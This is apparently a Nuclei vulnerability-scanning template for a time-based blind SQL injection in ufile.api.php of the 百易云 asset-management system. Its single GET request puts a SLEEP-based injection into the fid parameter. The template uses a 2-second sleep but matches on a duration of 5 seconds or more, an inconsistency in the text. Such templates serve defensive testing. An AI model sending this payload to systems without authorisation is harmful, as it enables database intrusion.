id: zgy-ufile-api-sqli

info:
  name: 百易云资产管理运营系统 ufile.api.php - SQL注入
  author: qwtd
  severity: high
  description: |-
    百易云资产管理运营系统 ufile.api.php 存在SQL注入漏洞，攻击者通过发送特制的SQL语句，可对数据库中的信息进行查看、添加、修改或删除。
  reference:
    - https://github.com/wy876/POC/blob/main/%E8%B5%84%E7%AE%A1%E4%BA%91/%E7%99%BE%E6%98%93%E4%BA%91%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9Fufile.api.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: 百易云资产管理运营系统

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/file/ufile.api.php?act=filedel&fid=1%20AND%20(SELECT%207357%20FROM%20(SELECT(SLEEP(2)))UPCw)"

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
          
      - type: word
        words:
          - "req_id"
          - "retcode"
        condition: and

      - type: status
        status:
          - 200